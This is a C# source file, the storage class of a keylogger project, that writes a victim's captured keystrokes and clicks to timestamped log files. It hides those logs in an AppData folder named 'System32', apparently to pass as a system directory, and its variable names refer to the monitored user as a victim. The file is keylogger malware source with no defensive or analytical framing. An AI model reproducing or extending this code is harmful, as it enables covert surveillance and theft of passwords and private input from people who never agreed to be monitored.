namespace Local_Keylogger_Agent
{
    internal class Storage
    {
        private static string AppDataDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System32";
        public static string BaseKeylogLogsFilePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System32\\KeyLogger\\";
        private static string AllVictimClicks = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System32\\KeyLogger\\AllClicks.txt";
        private static string OnlyKeyPressVictimClicks = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System32\\KeyLogger\\OnlyKeyPressClicks.txt";
        public static string KeyLogerCopyPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System32\\KeyLogger\\Copy\\";
        internal Storage()
        {
            // Ensure the directory exists
            if (!Directory.Exists(AppDataDirectory))
            {
                Directory.CreateDirectory(AppDataDirectory);
            }
            // Ensure the keylog file exists
            if (!Directory.Exists(BaseKeylogLogsFilePath))
            {
                Directory.CreateDirectory(BaseKeylogLogsFilePath);
            }
            if(!Directory.Exists(KeyLogerCopyPath))
            {
                Directory.CreateDirectory(KeyLogerCopyPath);
            }
        }

        public static void SaveAnyKeyLog(string content)
        {
            File.AppendAllText(AllVictimClicks, $"{DateTime.Now}: {content}\n");
        }
        public static void SaveOnlyKeyPressLog(string content)
        {
            File.AppendAllLines(OnlyKeyPressVictimClicks, new[] { $"{DateTime.Now}: {content}" });
        }
    }
}
